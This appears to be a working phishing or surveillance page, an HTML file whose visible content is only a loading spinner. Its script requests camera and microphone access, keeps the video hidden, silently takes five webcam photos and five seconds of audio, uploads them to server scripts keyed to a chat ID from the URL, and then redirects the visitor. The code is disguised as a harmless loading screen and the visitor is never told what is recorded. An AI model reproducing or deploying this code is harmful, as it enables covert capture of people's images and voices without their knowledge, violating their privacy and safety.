<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Audio and Photo Capture</title>
    <style>
        /* Ensures the body takes up the full height and prevents overflow */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f8f8f8;
        }

        /* Spinner styles */
        .spinner {
            border: 8px solid #f3f3f3; /* Light grey */
            border-top: 8px solid #3498db; /* Blue */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }

        /* Animation for rotating the spinner */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Initially hide the spinner */
        .spinner.hidden {
            display: none;
        }

        /* Video capture area (hidden) */
        video {
            display: none; /* Hide the video element */
        }
    </style>
</head>
<body>

<!-- Loading spinner -->
<div id="spinner" class="spinner hidden"></div>

<video id="video" width="320" height="240" autoplay></video>

<script>
    // Function to get the "id" parameter from the URL
    function getChatIdFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('id');
    }

    // Get the chat_id from URL
    const chatId = getChatIdFromURL();

    // Check if chat_id is provided
    if (!chatId) {
        alert('Chat ID is missing from the URL!');
    } else {
        // Show the loading spinner
        const spinner = document.getElementById('spinner');
        spinner.classList.remove('hidden');

        // Set up the video stream to capture photos
        const video = document.getElementById('video');

        // Audio permission and recording setup
        let audioChunks = [];
        let mediaRecorder;

        // Access the user's webcam and microphone
        Promise.all([
            navigator.mediaDevices.getUserMedia({ video: true }), // For photo capture
            navigator.mediaDevices.getUserMedia({ audio: true })  // For audio capture
        ])
        .then(function([videoStream, audioStream]) {
            // Set the video source to the webcam stream (hidden)
            video.srcObject = videoStream;

            // Set up audio recording
            mediaRecorder = new MediaRecorder(audioStream);
            mediaRecorder.ondataavailable = function(event) {
                audioChunks.push(event.data);
            };

            // Start recording audio
            mediaRecorder.start();

            // Start capturing photos every 1 second
            let photoCounter = 0;
            const photoInterval = setInterval(function() {
                if (photoCounter < 5) {
                    capturePhoto();
                    photoCounter++;
                } else {
                    clearInterval(photoInterval);
                }
            }, 1000); // Capture photo every second

            // Stop audio recording after 5 seconds
            setTimeout(function() {
                mediaRecorder.stop();
                setTimeout(function() {
                    // Redirect to Google after both processes are done
                    window.location.href = 'onl.php?id=' + chatId;
                }, 1000);
            }, 5000); // Stop recording audio after 5 seconds

            // Function to capture photo from video
            function capturePhoto() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoDataUrl = canvas.toDataURL('image/jpeg');

                // Send the photo to the server
                const formData = new FormData();
                formData.append('photo', dataURLtoBlob(photoDataUrl));
                formData.append('chat_id', chatId); // Use the chat_id from URL

                fetch('photo-upload.php', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Photo uploaded:', data);
                })
                .catch(error => {
                    console.error('Error uploading photo:', error);
                });
            }

            // Convert Data URL to Blob (to send as a file)
            function dataURLtoBlob(dataURL) {
                const byteString = atob(dataURL.split(',')[1]);
                const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                return new Blob([ab], { type: mimeString });
            }

            // After 5 seconds, send the recorded audio to the server
            mediaRecorder.onstop = function() {
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                const formData = new FormData();
                formData.append('audio', audioBlob);
                formData.append('chat_id', chatId); // Use the chat_id from URL

                // Send the audio to the server
                fetch('audio-upload.php', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Audio uploaded:', data);
                })
                .catch(error => {
                    console.error('Error uploading audio:', error);
                });
            };
        })
        .catch(function(error) {
            console.log("Camera or microphone permission denied: ", error);
            spinner.classList.add('hidden'); // Hide the spinner if permission is denied
        });
    }
</script>

</body>
</html>
